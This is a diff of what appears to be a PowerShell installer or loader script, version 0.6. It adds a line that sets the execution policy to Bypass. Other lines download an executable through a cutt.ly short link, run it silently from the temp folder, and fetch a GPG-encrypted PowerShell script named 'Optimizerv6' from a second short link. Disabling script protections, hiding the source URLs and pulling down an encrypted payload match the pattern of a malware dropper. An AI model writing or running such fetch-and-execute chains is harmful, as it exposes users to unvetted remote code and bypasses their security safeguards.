@@ -1,5 +1,6 @@
 ##V.0.6
 
+Set-ExecutionPolicy -ExecutionPolicy Bypass
 Invoke-WebRequest -Uri "https://cutt.ly/UN0iz0z" -OutFile "$env:temp\gnupg-w32-2.3.8_20221013.exe"
 cmd.exe /c $env:temp\gnupg-w32-2.3.8_20221013.exe /S /V /QN
 Invoke-WebRequest -Uri "https://cutt.ly/xN0inMf" -OutFile "$env:temp\Optimizerv6.ps1.gpg"
